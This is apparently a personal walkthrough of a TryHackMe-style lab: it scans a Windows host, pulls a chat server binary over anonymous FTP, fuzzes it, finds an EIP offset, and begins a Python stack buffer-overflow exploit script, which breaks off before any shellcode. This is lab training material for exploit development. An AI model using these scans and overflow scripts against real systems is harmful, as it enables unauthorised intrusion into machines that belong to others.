---
Reverse engineer a chat program and write a script to exploit a Windows machine.
---

![](https://i.imgur.com/rqwhSuo.png)


### Deploy Machine and Scan Network 

Deploy the machine and scan the network to start enumeration!

Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.139.173
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 18:17 EDT
Nmap scan report for 10.10.139.173
Host is up (0.21s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
3389/tcp open  tcpwrapped
| rdp-ntlm-info: 
|   Target_Name: BRAINSTORM
|   NetBIOS_Domain_Name: BRAINSTORM
|   NetBIOS_Computer_Name: BRAINSTORM
|   DNS_Domain_Name: brainstorm
|   DNS_Computer_Name: brainstorm
|   Product_Version: 6.1.7601
|_  System_Time: 2022-09-29T22:20:29+00:00
|_ssl-date: 2022-09-29T22:21:00+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=brainstorm
| Not valid before: 2022-09-28T22:07:14
|_Not valid after:  2023-03-30T22:07:14
9999/tcp open  abyss?
| fingerprint-strings: 
|   WMSRequest, afp, giop, ms-sql-s, oracle-tns: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters): Write a message:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=9/29%Time=63361A10%P=x86_64-pc-linux-gnu%r(WM
SF:SRequest,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(oracle-tns,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(ms-sql-s,63,"Welcome\x20t
SF:o\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usernam
SF:e\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(afp
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(giop,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\
SF:nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x2
SF:0Write\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   203.07 ms 10.11.0.1
2   204.51 ms 10.10.139.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.73 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.139.173


┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.173
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 18:29 EDT
Nmap scan report for 10.10.139.173
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
3389/tcp open  tcpwrapped
9999/tcp open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     Welcome to Brainstorm chat (beta)
|     Please enter your username (max 20 characters): Write a message:
|   NULL: 
|     Welcome to Brainstorm chat (beta)
|_    Please enter your username (max 20 characters):
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.92%I=7%D=9/29%Time=63361DEB%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|8.1|Phone (90%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_8.1:r1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (89%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (89%), Microsoft Windows Vista SP2 (89%), Microsoft Windows Server 2008 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   252.35 ms 10.11.0.1
2   253.23 ms 10.10.139.173

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 600.03 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.139.173

The scan has identified three open ports: 21 (FTP), 3389 (RDP) and 9999 (brainstorm chat).


Also using Netcat to interact with the service – it asks for a username and message, the message could be vulnerable to buffer overflow:

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc 10.10.139.173 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): witty
Write a message: laala


Thu Sep 29 16:01:31 2022
witty said: laala


Write a message:  jaja


Thu Sep 29 16:01:36 2022
witty said: jaja


Write a message:  ^C


ftp not work in my machine

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ftp 10.10.162.239 
Connected to 10.10.162.239.
220 Microsoft FTP Service
Name (10.10.162.239:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
229 Entering Extended Passive Mode (|||49159|)
ftp: Can't connect to `10.10.162.239:49159': Connection timed out
421 Service not available, remote server has closed connection.
229 Entering Extended Passive Mode (|||49159|)
ftp> ls
Not connected.
ftp> exit

maybe in attackbox

yep

root@ip-10-10-2-200:~/brainstorm# ftp 10.10.162.239
Connected to 10.10.162.239.
220 Microsoft FTP Service
Name (10.10.162.239:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
226 Transfer complete.
ftp> get chantserver.exe
local: chantserver.exe remote: chantserver.exe
200 PORT command successful.
550 The system cannot find the file specified. 
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 45 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
43747 bytes received in 0.00 secs (34.2251 MB/s)
ftp> exit
221 Goodbye.


getting the chatserver.exe


root@ip-10-10-2-200:~/brainstorm# nc 10.11.81.220 1337 < chatserver.exe
root@ip-10-10-2-200:~/brainstorm# ls -la
total 84
drwxr-xr-x  2 root root  4096 Sep 30 00:54 .
drwxr-xr-x 42 root root  4096 Sep 30 00:53 ..
-rw-r--r--  1 root root 43718 Sep 30 00:55 chatserver.exe
-rw-r--r--  1 root root 30738 Sep 30 00:54 essfunc.dll


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > essfunc.dll   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.2.200.
Ncat: Connection from 10.10.2.200:58476.
^C
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 84
drwxr-xr-x 2 kali kali  4096 Sep 29 20:01 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43718 Sep 29 19:58 chatserver.exe
-rw-r--r-- 1 kali kali 30738 Sep 29 20:01 essfunc.dll

root@ip-10-10-2-200:~/brainstorm# nc 10.11.81.220 1337 < essfunc.dll

now open a machine buffer overflow prep

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ xfreerdp /u:'admin' /p:'password' /v:10.10.99.157 /size:85%


Access

Transferring the EXE and DLLfiles to the windows machine, and starting the EXE file:
to use immunity debugger and mona

using powershell not work so just open internet explorer and go to http://ip:8000

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.99.157 - - [29/Sep/2022 20:19:50] "GET / HTTP/1.1" 200 -
10.10.99.157 - - [29/Sep/2022 20:19:50] code 404, message File not found
10.10.99.157 - - [29/Sep/2022 20:19:50] "GET /favicon.ico HTTP/1.1" 404 -
10.10.99.157 - - [29/Sep/2022 20:20:38] "GET /chatserver.exe HTTP/1.1" 200 -
10.10.99.157 - - [29/Sep/2022 20:20:51] "GET /essfunc.dll HTTP/1.1" 200 -


Creating the initial python fuzzer to find out what amount of bytes will cause the application to crash:

error opening chatserver so maybe is corrupted


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > chatserver.exe                                                               
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.25.204.
Ncat: Connection from 10.10.25.204:37462.
^C
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 56
drwxr-xr-x 2 kali kali  4096 Sep 29 21:03 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43747 Sep 29 21:03 chatserver.exe
-rw-r--r-- 1 kali kali   547 Sep 29 20:43 fuzzer.py
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc -nvlp 1337 > essfunc.dll   
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.25.204.
Ncat: Connection from 10.10.25.204:37464.
^C
                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ ls -la
total 88
drwxr-xr-x 2 kali kali  4096 Sep 29 21:05 .
drwxr-xr-x 3 kali kali  4096 Sep 29 19:00 ..
-rw-r--r-- 1 kali kali 43747 Sep 29 21:03 chatserver.exe
-rw-r--r-- 1 kali kali 30761 Sep 29 21:06 essfunc.dll
-rw-r--r-- 1 kali kali   547 Sep 29 20:43 fuzzer.py


root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < chatserver.exe
root@ip-10-10-25-204:~# nc 10.11.81.220 1337 < essfunc.dll 


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ msf-pattern_create -l 5000

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nc 10.10.99.157 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
Write a message: 

open with immunity debbuger and running

EIP 31704330


                                                                                                                 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ msf-pattern_offset -l 5000 -q 31704330
[*] Exact match at offset 2012

found offset 2012

Using Mona to calculate the EIP offset, which is 2012:


┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ nano exploit.py

The purpose of this step is to verify whether there is enough space for the shellcode immediately after EIP, which is what will be executed by the system in order to gain remote access. Adding about 400 C characters to the script for this phase:

this not work for me 
┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py
import socket, time

ip = "10.10.99.157"
port = 9999

offset = 2012
overflow = "A" * offset
retn = "BBBB"
padding = "C" * 400
payload = ""

buffer = overflow + retn + padding + payload 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send("user " + "\r\n")
  time.sleep(1)
  s.send(buffer + "\r\n")
  s.recv(1024)
  print("Done!")
except:
  print("Could not connect.")

so change fo it!

┌──(kali㉿kali)-[~/bufferoverflow/brainstorm]
└─$ cat exploit.py                         
import socket
import sys

username = b"witty"
message = b"A" * 2012 + b"B" * 4

try:
    print("Sending Payload...")
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.99.157', 9999))
    s.recv(1024)
    s.recv(1024)
    s.send(username + b'\r\n')
    s.recv(1024)
